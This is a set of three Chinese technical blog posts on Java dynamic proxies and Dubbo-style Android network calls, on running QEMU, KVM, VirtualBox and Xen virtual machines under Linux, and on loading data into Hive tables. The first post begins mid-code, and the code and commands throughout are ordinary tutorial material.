            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }   
}
由于生成的代理类继承自Proxy，super.h即是Prxoy的InvocationHandler，即代理类的request方法直接调用了InvocationHandler的实现，这就回答了InvocationHandler的invoke方法是如何被调用的了。
3.2 Cglib动态代理接口和类
Cglib的动态代理是通过Enhancer类实现的，其create方法生成动态代理的对象，有五个重载方法：
create():Object
create(Class, Callback):Object
create(Class, Class[], Callback):Object
create(Class, Class[], CallbackFilter, Callback):Object
create(Class[], Object):Object
常用的是第二个和第三个方法，分别用于动态代理类和动态代理接口，其使用方法如下：
private Object getProxy() {
    // 1. 动态代理类
    return Enhancer.create(RealSubject.class, new MyMethodInterceptor());
    // 2. 动态代理接口
    return Enhancer.create(Object.class, new Class<?>[]{Subject.class}, new MyMethodInterceptor());
}

private static class MyMethodInterceptor implements MethodInterceptor {

    @Override
    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {
        System.out.println("Some thing before method invoke");
        Object result = proxy.invokeSuper(obj, args);
        System.out.println("Some thing after method invoke");
        return result;
    }
}
从上小节可知，JDK只能代理接口，代理生成的类实现了接口的方法；而Cglib是通过继承被代理的类、重写其方法来实现的，如：create方法入参的第一个参数就是被代理类的类型。当然，Cglib也能代理接口，比如getProxy()方法中的第二种方式。
四、案例：Android端dubbo:reference化的网络访问
Dubbo是一款高性能的Java RPC框架，是服务治理的重量级中间件。Dubbo采用dubbo:service描述服务提供者，dubbo:reference描述服务消费者，其共同必填属性为interface，即Java接口。Dubbo正是采用接口来作为服务提供者和消费者之间的“共同语言”的。
在移动网络中，Android作为服务消费者，一般通过HTTP网关调用后端服务。在国内的大型互联网公司中，Java后端大多采用了Dubbo及其变种作为服务治理、服务水平扩展的解决方案。因此，HTTP网关通常需要Android的网络请求中提供调用的服务名称、服务方法、服务版本、服务分组等信息，然后通过这些信息反射调用Java后端提供的RPC服务，实现从HTTP协议到RPC协议的转换。

关于Android访问网关请求，其分层结构可参考《基于Retrofit+RxJava的Android分层网络请求框架》。

那么，Android端能否以dubbo:reference化的方式申明需要访问的网络服务呢？如何这样，将极大提高Android开发人员和Java后端开发之间的沟通效率，以及Android端的代码效率。
首先，自定义服务的消费者注解Reference，通过该注解标记某个服务。
@Inherited
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Reference {
    // 服务接口名
    String service() default "";
    // 服务版本
    String version() default "";
    // 服务分组
    String group() default "";
    // 省略字段
}
其次，通过接口定义某个服务消费（如果可以直接引入后端接口，此步骤可省略），在注解中指明该服务对应的后端服务接口名、服务版本、服务分组等信息；
@Reference(service = "com.yhthu.java.ClassTestService",  group = "yhthu",  version = "v_test_0.1")
public interface ClassTestService {
    // 实例方法
    Response echo(String pin);
}
这样就完成了服务的申明，接下来的问题是如何实现服务的调用呢？上述申明的服务接口如何定义实现呢？这里就涉及依赖注入和动态代理。我们先定义一个标记注解@Service，标识需要被注入实现的服务申明。
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Service {
}
// 在需要使用服务的地方（比如Activity中）申明需要调用的服务
@Service
private ClassTestService classTestService;
在调用classTestService的方法之前，需要注入该接口服务的实现，因此，该操作可以在调用组件初始化的时候进行。
// 接口与对应实现的缓存
private Map<Class<?>, Object> serviceContainer = new HashMap<>();
// 依赖注入
public void inject(Object obj) {
    // 1. 扫描该类中所有添加@Service注解的域
    Field[] fields = obj.getClass().getDeclaredFields();
    for (Field field : fields) {
        if (field.isAnnotationPresent(Service.class)) {
            Class<?> clazz = field.getType();
            if (clazz.getAnnotation(Reference.class) == null) {
                Log.e("ClassTestService", "接口地址未配置");
                continue;
            }
            // 2. 从缓存中取出或生成接口类的实现（动态代理）
            Object impl = serviceContainer.get(clazz);
            if (impl == null) {
                impl = create(clazz);
                serviceContainer.put(clazz, impl);
            }
            // 3. 设置服务接口实现
            try {
                field.setAccessible(true);
                field.set(obj, impl);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }
}
inject方法的关键有三步：

扫描该类中所有添加@Service注解的字段，即可得到上述代码示例中的ClassTestService字段；
从缓存中取出或生成接口类的实现。由于通过接口定义了服务，并且实现不同服务的实现方式基本一致（即将服务信息发送HTTP网关），在生成实现上可选择JDK的动态代理。
设置服务接口实现，完成为接口注入实现。

private <T> T create(final Class<T> service) {
    return (T) Proxy.newProxyInstance(service.getClassLoader(), new Class<?>[]{service}, new InvocationHandler() {
        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            // 1. 获取服务信息
            Annotation reference = service.getAnnotation(Reference.class);
            String serviceName = ((Reference) reference).service();
            String versionName = ((Reference) reference).version();
            String groupName = ((Reference) reference).group();
            // 2. 获取方法名
            String methodName = method.getName();
            // 3. 根据服务信息发起请求，返回调用结果
            return Request.request(serviceName, versionName, groupName, methodName, param);
        }
    });
}
在HTTP网关得到服务名称、服务方法、服务版本、服务分组等信息之后，即可实现对后端服务的反射调用。总的来讲，即可实现Android端dubbo:reference化的网络访问。
// 调用ClassTestService服务的方法
classTestService.echo("yhthu").callback(// ……);

上述代码实现均为伪代码，仅说明解决方案思路。

在该案例中，综合使用了自定义注解、反射以及动态代理，是对上述理论知识的一个具体应用。

********************************************************************************************************************************************************************************************************
Linux 桌面玩家指南：07. Linux 中的 Qemu、KVM、VirtualBox、Xen 虚拟机体验

特别说明：要在我的随笔后写评论的小伙伴们请注意了，我的博客开启了 MathJax 数学公式支持，MathJax 使用$标记数学公式的开始和结束。如果某条评论中出现了两个$，MathJax 会将两个$之间的内容按照数学公式进行排版，从而导致评论区格式混乱。如果大家的评论中用到了$，但是又不是为了使用数学公式，就请使用\$转义一下，谢谢。

想从头阅读该系列吗？下面是传送门：

Linux 桌面玩家指南：01. 玩转 Linux 系统的方法论 【约 1.1 万字，22 张图片】
Linux 桌面玩家指南：02. 以最简洁的方式打造实用的 Vim 环境 【约 0.97 万字，7 张图片】
Linux 桌面玩家指南：03. 针对 Gnome 3 的 Linux 桌面进行美化 【约 0.58 万字，32 张图片】
Linux 桌面玩家指南：04. Linux 桌面系统字体配置要略 【约 1.2 万字，34 张图片】
Linux 桌面玩家指南：05. 发博客必备的图片处理和视频录制神器 【约 0.25 万字，14 张图片】
Linux 桌面玩家指南：06. 优雅地使用命令行及 Bash 脚本编程语言中的美学与哲学 【约 1.4 万字，16 张图片】

前言
是时候聊一下虚拟机了，因为我后面即将聊的 Linux 玩法，包括硬盘分区以及在同一块硬盘上安装多个 Linux 发行版、在 X86 的实模式下运行 16 位的程序、探索 Grub 和 Linux 纯字符模式等等，要截图和录像的话，必须借助于虚拟机。
说起虚拟机，大家都不陌生。需要使用虚拟机的场景也非常的多，对于有志于写操作系统的同志，往往需要一个虚拟机来运行和调试他写的系统；对于喜欢研究网络体系结构的朋友，往往需要在自己的电脑上虚拟出 N 个系统组成各种各样的网络。（这个需要电脑的配置够强大才行，幸好本人的电脑够。）还有些朋友用着 Windows 却想玩 Linux，用着 Linux 却想玩 Windows，这样用虚拟机玩起来也比较方便；最后对于在 Linux 环境下解决起来比较困难的一些需求，如迅雷、QQ、网银、支付宝等，使用虚拟机安装一个 Windows 系统，也可以非常轻松地搞定。我自己也经常在 Windows 中用 VMWare，感觉它功能强大、使用方便，运行效率也非常高。我的博客中有不少内容都是在虚拟机中折腾出来的。在 Linux 系统下，我也用虚拟机，这一篇随笔就向大家展示一下 Linux 中的几种常见的虚拟机软件。
虚拟机的分类很复杂。什么全虚拟、半虚拟什么的搞得人头晕。而且桌面用户和企业级用户对虚拟机的期望值是不一样的。比如说，我可能期望这样一个虚拟机：
1.它能模拟出一台完整的个人电脑，我可以给它安装任何我想安装的操作系统；
2.它要有比较好用的图形界面，模拟出的电脑也要能无障碍运行 Windows 或 Gnome 这样的图形系统，能打游戏最好；
3.客户操作系统所用的硬盘就是宿主操作系统中的一个镜像文件，随时可复制粘贴，随时可打包带走；
4.最好能模拟出一些本身不存在的硬件，像多个网卡什么的。
很显然，VMWare Workstation 就是这样一个可以完美满足我要求的桌面用户最满意的虚拟机。我经常使用它来折腾各个 Linux 发行版，而且运行流畅。当然，在 Linux 这个开源的世界我们是不该去使用破解版这样的东西的。不过不用担心，在 Linux 江湖中，还有 VirtualBox、QEMU 这样的虚拟机软件可用。
而企业级用户呢，他们期望的虚拟机可能是这样的：
1.它不一定要能模拟出一台完整的电脑，重点是 CPU、内存、磁盘和网卡，重点是能当服务器使用；
2.它性能一定要好，虚拟的 CPU 性能一定要接近物理 CPU，一定要充分利用物理 CPU 的所有特性，为了性能，甚至只能安装经过修改过内核的操作系统；（所谓的半虚拟化技术。）
3.它隔离性一定要好，它的目的是把一台机器分成 N 台机器用，而管理这 N 台虚拟机的宿主机要越不占用资源越好，客户机是主，宿主机是次；（正如 Xen 这样。）
4.由于企业级用户对性能的追求，所以客户机所用的硬盘可能真是一个独立的物理硬盘、磁盘阵列、网络文件系统什么的，而不仅仅只是宿主机上的一个镜像文件；
5.它不一定需要有图形界面，因为使用命令行更容易管理，像自动化啊、远程化啊、批量化啊什么的；
6.更多的企业级高可用性需求，像什么热备份啊、动态迁移啊等等。
从上面这些期望值可以看出，虚拟机领域水很深，市场前景也很广阔。各个虚拟机厂家把自家产品吹得天花乱坠那也是很常见的，因为每一个用户期望的点都可以大做文章嘛。所谓临渊羡鱼，不如退而结网，各种虚拟机看得再过瘾，也不如自己尝试一下。
能模拟不同硬件架构的虚拟机 —— QEMU
还是老规矩，先给出参考资料，它的学习资料还在这里： QEMU 的官方文档。
或者，在自己的系统中输入如下命令查看手册页：
man qemu-system-i386
man qemu-img
等等...
QEMU 本身是一个非常强大的虚拟机，甚至在 Xen、KVM 这些虚拟机产品中都少不了 QEMU 的身影。在 QEMU 的官方文档中也提到，QEMU 可以利用 Xen、KVM 等技术来加速。为什么需要加速呢，那是因为如果单纯使用 QEMU 的时候，它里面的 CPU 等硬件都是模拟出来的，也就是全虚拟化，所以运行速度是肯定赶不上物理硬件的。它甚至可以模拟不同架构的硬件，比如说在使用 Intel X86 的 CPU 的电脑中模拟出一个 ARM 体系的电脑或 MIPS 体系的电脑，这样模拟出的 CPU，运行速度更加不可能赶上物理 CPU。使用加速以后呢，可以把客户操作系统的 CPU 指令直接转发到物理 CPU，自然运行效率大增。
QEMU 同时也是一个非常简单的虚拟机，给它一个硬盘镜像就可以启动一个虚拟机，如果想定制这个虚拟机的配置，用什么样的 CPU 啊、什么样的显卡啊、什么样的网络配置啊，只需要指定相应的命令行参数就可以了。它支持许多格式的磁盘镜像，包括 VirtualBox 创建的磁盘镜像文件。它同时也提供一个创建和管理磁盘镜像的工具 qemu-img。QEMU 及其工具所使用的命令行参数，直接查看其文档即可。
下面开始体验。先看看 Ubuntu 软件源中和 QEMU 有关的包有哪些：


我的电脑是 Intel 的 CPU，而我想虚拟的也是个人电脑，所以我安装的自然是 qemu-system-x86，另外一个有用的是 qemu-utils。查看 QEMU 软件包中的工具及文档：

使用 qemu-img 创建磁盘映像文件，使用 qemu-system-i386 启动虚拟机，并安装操作系统：

WinXP 估计是目前全网络上最好下载的操作系统了。运行以上命令后，弹出熟悉的系统安装界面。安装过程我就不啰嗦了。下图是安装完 WinXP 操作系统之后的效果。可以给 qemu-system-i386 指定更多的参数，在再一次启动 WinXP 的时候，我除了给它分配了 2G 内存，我还使用 -smp 2 参数为它分配了两个 CPU，还使用 -vga vmware 为它指定和 VMWare 虚拟显卡一样的显卡。虽然指定两个 CPU，但是性能仍较差。随便拖动一下窗口 CPU 使用率就飙升到 100%。

而且从上图中可以看到，虚拟机中的 CPU 虽然显示为 3.5GHz，但是很显然是 QEMU 模拟出来的，和物理 CPU 有显著差别。事实上我的电脑配置相当强悍，Core i7-4770K 的四核八线程 CPU，请看 lshw 的输出结果：

Intel Core i7-4770K 的 CPU，虚拟出的 XP 也分配了 2G 的内存和两个 CPU，但是流畅度仍较差。说明单纯使用 QEMU 还是不能满足我们桌面用户的需要。配合Xen 或者 KVM 呢？性能是否会有质的飞跃呢？
被加入 Linux 内核的虚拟机 —— KVM
上一节展示的 QEMU 是一个强大的虚拟机软件，它可以完全以软件的形式模拟出一台完整的电脑所需的所有硬件，甚至是模拟出不同架构的硬件，在这些虚拟的硬件之上，可以安装完整的操作系统。QEMU 的运行模式如下图：

很显然，这种完全以软件模拟硬件的形式虽然功能强大，但是性能难以满足用户的需要。模拟出的硬件的性能和物理硬件的性能相比，必然会大打折扣。为了提高虚拟机软件的性能，开发者们各显神通。其中，最常用的办法就是在主操作系统中通过内核模块开一个洞，通过这个洞将虚拟机中的操作直接映射到物理硬件上，从而提高虚拟机中运行的操作系统的性能。如下图：

其中 KVM 就是这种加速模式的典型代表。在社区中，大家常把 KVM 和 Xen 相提并论，但是它们其实完全不一样。从上图可以看出，使用内核模块加速这种模式，主操作系统仍然占主导地位，内核模块只是在主操作系统中开一个洞，用来连接虚拟机和物理硬件，给虚拟机加速，但是虚拟机中的客户操作系统仍然受到很大的限制。这种模式比较适合桌面用户使用，主操作系统仍然是他们的主战场，不管是办公还是打游戏，都通过主操作系统完成，客户操作系统只是按需使用。至于 Xen，则完全使用不同的理念，比较适合企业级用户使用，桌面用户就不要轻易去碰了，具体内容我后面再讲。
其实 VirtualBox 也是采取的这种内核模块加速的模式。我之所以这么说，是因为在安装 VirtualBox 时，它会要求安装 DKMS。如下图：

熟悉 Linux 的人知道，DKMS 就是为了方便用户管理内核模块而存在的，不熟悉 DKMS 的人 Google 一下也可以了解个大概。关于 VirtualBox 的具体使用方面的内容，我下一节再讲。这一篇主要讲 KVM。
KVM 和 QEMU 是相辅相成的，QEMU 可以使用 KVM 内核模块加速，而 KVM 需要使用 QEMU 运行虚拟机。从上图可以看到，如果要使用 Ubuntu 的包管理软件安装 KVM，其实安装的就是 qemu-kvm。而 qemu-kvm 并不是一个什么很复杂的软件包，它只包含很少量几个文件，如下图：

用 man 命令查看一下它的文档，发现 qemu-kvm 包不仅包含的文件很少，而且它的可执行文件 kvm 也只是对 qemu-system-x86_64 命令的一个简单包装，如下图：

那么问题来了，kvm 内核模块究竟是由哪个包提供的呢？其实，自从 Linux 2.6 开始，kvm 就已经被加入内核了。如果非要找出 kvm 内核模块 kvm.ko 是由哪个包提供的，可以用如下命令考察一下：

写到这里，已经可以看出 KVM 的使用是很简单的了。下面，我使用 KVM 运行一下上一篇中安装的 WinXP 操作系统，体验一下 QEMU 经过 KVM 加速后的运行效率。使用如下命令运行使用 KVM 加速的 QEMU：

可以看出，使用 KVM 加速后，虚拟机中的 WinXP 运行速度提升了不少，开机只用了 34 秒。我将分辨率调整为 1366*768，图形界面运行也很流畅，不管是打开 IE 浏览器还是 Office 办公软件都没有问题，再也没有出现 CPU 使用率飙升到 100% 的情况。如果用 ps -ef | grep qemu 命令查看一下，发现 kvm 命令运行的还是 qemu-system-x86_64 程序，只不过加上了 -enable-kvm 参数，如下图：

另外，对于桌面用户来说，有一个好用的图形化界面也是很重要的。虽然 QEMU 和 KVM 自身不带图形界面的虚拟机管理器，但是我们可以使用第 3 方软件，比如 virt-manager。只需要使用 sudo apt-get install virt-manager 即可安装该软件。该软件依赖于 libvirt，在安装过程中也会自动安装。运行 virt-manager 的效果如下图，注意必须使用 sudo 运行，因为该软件需要超级用户权限：

该软件可自动识别系统中的虚拟机环境是 QEMU+KVM 还是 Xen。新建一个虚拟机，由于之前安装过一个 WinXP 系统，所以选择导入现有硬盘镜像。点下一步后，出现如下界面：

这一步没什么好说的，再点下一步，如下图：

这里可以设置网络选项。如果勾选“在安装前自定义配置”的话，还可以对硬件进行进一步的自定义，如下图：

在上图中，我们可以看到虚拟机支持的所有虚拟显卡的类型，在这里，我当然选择的是 VMVGA，因为我以前经常用 VMWare，知道这些操作系统在 VMWare 的虚拟显卡设置下运行得都没有问题。当然，其它的选项都可以试一下，不过在虚拟的操作系统中需要安装相应的驱动程序。
最后，虚拟机运行的效果图如下：

可以看到，该程序提供的界面有非常丰富的功能菜单，功能是非常强大的，甚至可以向虚拟机中的操作系统发送组合按键。
可以这么说，如果没有 VirtualBox 的话，QEMU+KVM 的组合应该是桌面用户的首选。
VirtualBox —— 性能强大的经典架构
VirtualBox 号称是目前开源界最强大的虚拟机产品，在 Linux 平台上，基本上都被大家选择为首选的虚拟机软件。VirtualBox 的强大不是盖的，毕竟其后台是超有钱的 Oracle 公司。VirtualBox 的任性也不是盖的，它硬是没有使用我前文所述的那些 qemu、kvm、libvirt 等被各个虚拟机使用的开源组件，它的前端、后端以及内核加速模块都是自己开发的，唯有远程桌面所需要的 VNC 大约使用了 libvncserver。
我在标题中说到 VirutalBox 是使用的经典架构。所谓经典，主要体现在以下几个方面：
1.虚拟机及虚拟机中的系统（Guest System）仍运行于主操作系统（Host System）之上，只是通过主操作系统的内核模块进行加速；
2.Unix 系统中 Front-End 模式的经典架构，在 VirtualBox 中，VirtualBox 的图形界面只不过是命令行界面的虚拟机软件 VBoxManage 的图形包装而已，同时，它还提供 VBoxSDL、VBoxHeadless 等命令行工具。VBoxHeadless 就可以运行一个不显示虚拟机桌面的虚拟机，如果要显示桌面，可以运行一个远程桌面连接它。前后端分离有一个好处，就是对于桌面用户，可以使用前端的图形界面简化操作，而对于企业级用户，可以使用命令行工具构建自动化脚本，甚至在系统启动时自动运行虚拟机。
我并不是一开始就喜欢上 VirtualBox 的，一点小小的插曲差点就让我错过了这么好的虚拟机软件。本来我刚开始看到在各个 Linux 论坛都将 VirtualBox 放到首位，而不是在新闻中铺天盖地的 KVM、Xen，我就觉得 VirutalBox 可能有点不够专业，再加上第一次使用 VirtualBox 时，发现它不能完美转发 Ctrl+Alt+Fx（x=1～12），发现它的有些配置不能完全在图形界面中设置，需要手动更改配置文件，然后我就放弃了。直到我掌握的正确的折腾 Linux 的方法论，看完了它长达 369 页的用户手册，我才真正了解了它的强大，并深深爱上了它。VirtualBox 把右边的 Ctrl 定义为 Host 键，要向客户机发送 Ctrl+Alt+Fx，只需要按 Host+Fx 就行了。
首先，在 Ubuntu 中安装 VirutalBox 是非常容易的，只需要一个 sudo apt-get install virtualbox 即可。
安装完 VirtualBox 后，可以考察一下它所遵守的我之前提到的“经典架构”，命令和运行结果如下图：

lsmod 命令可以看到 VirtualBox 安装后，在主操作系统中安装了好几个内核模块，用来对虚拟机进行加速。至于使用内核模块对虚拟机加速的图片我这里就不再贴了，请大家参考我的上一篇。通过 dpkg -L 命令可以考察 VirtualBox 提供了哪些命令行工具。最后，通过 dpkg -S 命令可以看到，VirtualBox这个可执行程序其实是属于 virtualbox-qt 软件包的，它只是一个图形界面的封装。
启动 VirtualBox，新建虚拟机和安装操作系统的过程我就不多说了，图形界面很强大，一步一步执行准没错。安装完 WinXP 后，运行效果如下图：

从该图中可以看出，WinXP 系统认出的 CPU 是准确的 Intel Core i7-4770K，虽然我只给它分配了两个核心。但是显卡不能准确识别。之所以是这样，是因为 WinXP 系统中没有相应的驱动，所以，需要安装 VirtualBox 的客户系统增强工具。在菜单栏选择安装增强功能，如下图：

然后 VirtualBox 就会给 WinXP 安装一个虚拟光盘，双击该光盘，就可以在 WinXP 系统中安装客户系统增强工具，如下图：

客户系统增强工具是安装在 Guest System 中的，可以认为客户系统增强工具主要是包含了客户操作系统中所需要驱动，因为没有这些驱动，客户操作系统可能无法认识那些虚拟出来的硬件，比如虚拟显卡什么的。当然，客户系统增强工具的功能远远不止这些，比如显卡 3D 加速啊、主操作系统和客户操作系统共享文件夹啊什么的，还有一个最牛 B 的，那就是让客户操作系统进入无缝模式。比如安装完用户增强工具后，可以识别出显卡类型，并且有不同的分辨率选项，如下图：

按 Host+L 键，可以键入无缝模式，如下图，可以看到在 Ubuntu 系统中，Ubuntu 风格的窗口和 WinXP 风格的窗口共存：

再玩大一点，使用 IE 浏览器访问博客园，如下图：

由此可见，在 Linux 系统中使用 Windows 的软件进行办公不再是梦，什么网银、什么 QQ，一样毫无障碍。再按 Host+L 键，虚拟机会回到窗口模式。
VirtualBox 功能非常强大，单凭我这一篇博文是不可能学会的。好在是我这一个系列一直都是秉承“授人以鱼不如授人以渔”的原则，一直都是指导折腾 Linux 系统的方法论，并贴图让没有亲自动手机会的人也对 Linux 系统有一个直观的感受，也一直指出从哪里可以找到相应的学习资料。用 dpkg -L 命令，就可以找出我前面提到的 VirtualBox 自带的长达369页的文档，使用 Ubuntu 自带的 evince 阅读器阅读之，如下图：

当然，也可以从官网下载 VirtualBox 官方文档 pdf 版，放到手机上有空的时候慢慢阅读。至于我前面说的 VirtualBox 这不能那不能什么的，完全都是我自己不切实际的瞎说，等你看完它的文档，你就会发现它没有什么是不能的。就 VirtualBox 在我机器上的运行效果看，流畅度要超过前面的 QEMU+KVM组合，图形性能也要更加强大。它的文档中还有更多更高级的玩法，仔细阅读吧，精通命令行和配置文件不是梦，而且 VirtualBox 并不仅仅适用于桌面用户，对于企业级的应用，它也是可以的。
Xen —— 令人脑洞大开的奇异架构
在虚拟机领域，Xen 具有非常高的知名度，其名字经常在各类文章中出现。同时 Xen 也具有非常高的难度，别说玩转，就算仅仅只是理解它，都不是那么容易。之所以如此，那是因为 Xen 采用了和我前面介绍的那几个虚拟机完全不同的架构。在这里，我称之为令人脑洞大开的奇异架构。
在经典的虚拟机架构中，虚拟机软件运行于 Host System 之中，而 Guest System 运行于虚拟机软件之中。为了提高 Guest System 的运行速度，虚拟机软件一般会在 Host System 中使用内核模块开一个洞，将 Guest System 的运行指令直接映射到物理硬件上。但是在 Xen 中，则根本没有 Host System 的概念，传说它所有的虚拟机都直接运行于硬件之上，虚拟机运行的效率非常的高，虚拟机之间的隔离性非常的好。
当然，传说只是传说。我刚开始也是很纳闷，怎么可能让所有的虚拟机都直接运行于硬件之上。后来我终于知道，这只是一个噱头。虚拟机和硬件之间，还是有一个管理层的，那就是 Xen Hypervisor，只不过这个管理层可以做得相当薄。当然 Xen Hypervisor 的功能毕竟是有限的，怎么样它也比不上一个操作系统，因此，在 Xen Hypervisor 上运行的虚拟机中，有一个虚拟机是具有特权的，它称之为 Domain 0，而其它的虚拟机都称之为 Domain U。
Xen的架构如下图：

从图中可以看出，Xen 虚拟机架构中没有 Host System，在硬件层之上是薄薄的一层 Xen Hypervisor，在这之上就是各个虚拟机了，没有 Host System，只有 Domain 0，而 Guest System 都是 Domain U，不管是 Domain 0 还是 Domain U，都是虚拟机，都是被虚拟机软件管理的对象。
既然 Domain 0 也是一个虚拟机，也是被管理的对象，所以可以给它分配很少的资源，然后将其余的资源公平地分配到其它的 Domain。但是很奇怪的是，所有的虚拟机管理软件其实都是运行在这个 Domain 0 中的。同时，如果要连接到其它 Guest System 的控制台，而又不是使用远程桌面（VNC）的话，这些控制台也是显示在 Domian 0 中的。所以说，这是一个奇异的架构，是一个让人很不容易理解的架构。
这种架构桌面用户不喜欢，因为 Host System 变成了 Domain 0，本来应该掌控所有资源的主操作系统变成了一个受管理的虚拟机，本来用来打游戏、编程、聊天的主战场受到限制了，可能不能完全发挥硬件的性能了，还有可能运行不稳定了，自然会心里不爽。（Domain 0确实不能安装专用显卡驱动，确实会运行不稳定，这个后面会讲。）但是企业级用户喜欢，因为所有的 Domain 都是虚拟机，所以可以更加公平地分配资源，而且由于 Domain U 不再是运行于 Domian 0 里面的软件，而是和 Domain 0 平级的系统，这样即使 Domain 0 崩溃了，也不会影响到正在运行的 Domain U。（真的不会有丝毫影响吗？我表示怀疑。）
下面开始在 Ubuntu 系统中体验 Xen。使用如下命令可以在 Ubuntu 的软件源中搜索和 Xen 相关的软件包以及安装 Xen Hypervisor：
sudo aptitude search xen
sudo aptitude install xen-hypervisor-4.4-amd64
传说在旧版本的 Xen Hypervisor 上只能运行经过修改过的 Linux 内核。但是在目前的版本中不存在该问题。我机器上的 Ubuntu 14.10 系统不经任何修改，就可以当成 Domain 0 中的系统运行。至于是否让该系统运行于 Xen Hypervisor 上，在启动时可以选择，如下图：

通过查看 Grub 的配置文件，可以看到通过 Xen 虚拟机启动 Ubuntu 系统时，Grub 先启动的是 /boot/xen-4.4-amd64.gz，然后才把 Linux 内核以及 initrd 文件作为模块载入内存。也就是说，Grub 启动 Xen Hypervisor，然后 Xen Hypervisor 运行 Domian 0。

前面提到 Host System 一下子变成了 Domain 0 中的操作系统是让桌面用户比较不爽的事，这里详细论述。虽然说目前的 Xen 同时支持全虚拟化和半虚拟化，支持操作系统不经任何修改就运行于 Xen 虚拟机上（全虚拟），但是系统是否稳定还是和内核有很大关系的。比如说我在 Ubuntu 14.04 刚推出的那段时间，在 Ubuntu 14.04 中使用 Xen 是没有什么问题的，但是经过几次系统升级后，Xen 就出问题了，没办法成功进入 Domain 0 中的 Ubuntu 14.04。现在我用的是 Ubuntu 14.10，已经升过好几次级了，目前使用Xen还是很稳定的。其次就是显卡驱动的问题，我的 Ubuntu 当主系统用时，使用的是 NVIDIA 的显卡驱动，但是当 Ubuntu 运行于 Domain 0 中时，就不能使用 NVIDIA 的显卡驱动了，否则无法进入图形界面。
下面来测试一下 Xen 虚拟机的运行效果。通过前文的探讨，可以看出一个虚拟机的运行需要两个要素：一是一套虚拟的硬件系统，二是一个包含了操作系统的磁盘镜像。QEMU 虚拟机关于硬件的配置全由命令行指定，VirtualBox 虚拟机的硬件配置存在于配置文件中，而 Xen 呢，它也存在于配置文件中，这个配置文件要我们自己写。至于磁盘镜像，还是复用我之前创建的那个 WinXP.img 吧，记住，它是 qcow2 格式的。
先进入我主目录的 virtual-os 目录，ls 看一下，里面有我之前创建的 WinXP.img。然后，我们创建一个 WinXP_Xen.hvm 配置文件，其内容如下：
builder = "hvm"
name = "WinXP_Xen.hvm"
memory = 2048
vcpus = 2
disk = [ '/home/youxia/virtual-os/WinXP.img, qcow2, hda, rw' ]
sdl = 1
这段配置文件很简单，也很容易懂。 hvm 代表这是一个全虚拟化的虚拟机，和全虚拟化相对的是半虚拟化，半虚拟化只能运行经过修改的内核，但是可以获得更高的性能。为该虚拟机分配 2 个 CPU 和 2G 内存，并指定硬盘镜像文件。最后一个 sdl=1 表示使用 SDL 图形库显示虚拟操作系统的界面，如果不想用 SDL，也可以写成 vnc=1，这样需要使用 vncviewer 才能连接到虚拟机操作系统的桌面。
至于 Xen 的配置文件怎么写，管理命令怎么用，这个必须得有学习资料。通过 man xl 和 man xl.cfg 查看手册页是可以的，但是最全面的资料还是在 Xen 的官网 上。
使用 sudo xl list 命令可以看到系统中只有一个Domain 0在运行，然后使用 sudo xl create -c WinXP_Xen.hvm 即可运行一个 Domian U 虚拟机，该虚拟机使用 WinXP_Xen.hvm 配置文件。 xl 命令的 -c 选项表示把 Domain U 的控制台显示在 Domain 0 中，如果不用 -c 选项而使用 -V 选项，则创建虚拟机后使用 vncviewer 进行连接。新建的虚拟机运行起来后，再次使用 sudo xl list 命令，可以看到除了Domain 0，还多了一个名称为“WinXP_Xen.hvm”的虚拟机。运行效果如下图：

关于 Xen 更多更高级的功能，比如动态迁移什么的，我这里就不试了。至于说到 Xen 虚拟机的隔离性，如果一个 Domain U 崩溃了，肯定是不会影响到 Domain 0和其它 Domain U 的，但是如果 Domain 0 崩溃了，Domain U 真的不会受到任何影响吗？Domain 0 崩溃了怎么重启它呢？这都是我没想明白的问题。在折腾 Xen 的过程中，我曾多次重启过机器，重启后一看，WinXP_Xen.hvm 还在继续运行，似乎是没有受到 Domain 0 的影响，但是我就想，我机器都重启了，电源都断了，Domain U 它真的能丝毫不受影响吗？
我觉得，Xen 虚拟机不应该是桌面用户的首选，因为它架构比较奇异不容易理解，可能因内核升级而出现不稳定，不能充分发挥桌面硬件的性能，如不能使用 Nvidia 的显卡；桌面用户还是应该首选 VirtualBox。企业及客户可以考虑 Xen，因为它可以提供较好的性能和隔离性，企业级用户不需要桌面用户那么多的功能，所以可以把 Domain 0 做到很薄，可以完全不要图形界面，也不用经常升级内核，甚至可以选择一个经过修改优化的内核，这样就可以在一套硬件上运行尽可能多的虚拟机。
关于 Linux 下虚拟机相关的内容，就写到这里吧。欢迎大家批评指正。
求打赏
我对这次写的这个系列要求是非常高的：首先内容要有意义、够充实，信息量要足够丰富；其次是每一个知识点要讲透彻，不能模棱两可含糊不清；最后是包含丰富的截图，让那些不想装 Linux 系统的朋友们也可以领略到 Linux 桌面的风采。如果我的努力得到大家的认可，可以扫下面的二维码打赏一下：

版权申明
该随笔由京山游侠在2018年10月08日发布于博客园，引用请注明出处，转载或出版请联系博主。QQ邮箱：1841079@qq.com

********************************************************************************************************************************************************************************************************
一起学Hive——详解四种导入数据的方式
在使用Hive的过程中，导入数据是必不可少的步骤，不同的数据导入方式效率也不一样，本文总结Hive四种不同的数据导入方式：

从本地文件系统导入数据
从HDFS中导入数据
从其他的Hive表中导入数据
创建表的同时导入数据

使用导入数据时，会使用到into和overwrite into两个关键字，into是在当前表追加数据，而overwrite into是删除当前表的数据然后在导入数据。
从本地系统导入数据
在Hive中创建load_data_local表，该表中有两个字段，一个是name一个是age。创建表的SQL语句如下:
create table if not exists load_data_local(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
在本地文件系统中创建一个load_data_local.txt的文件，然后往里面写入数据，数据之间用空格分隔。数据为：
zhangsan 30
lisi 50
wangwu 60
peiqi 6
执行load data local inpath '/home/hadoop/hive_test/load_data_local.txt' into table load_data_local;命令，即可将本地系统中的文件的数据导入到Hive表中。
在使用从本地系统导入数据大Hive表中时，文件的路径必须使用绝对路径。
有两种方式验证数据是否导入成功，一种是在Hive中执行select * from load_data_local。另外一种是查看hdfs文件系统中的load_data_local目录下面是否有刚刚上传的load_data_local.txt文件，查看命令为：hadoop fs -ls /user/hive/warehouse/bigdata17.db/load_data_local，结果为：
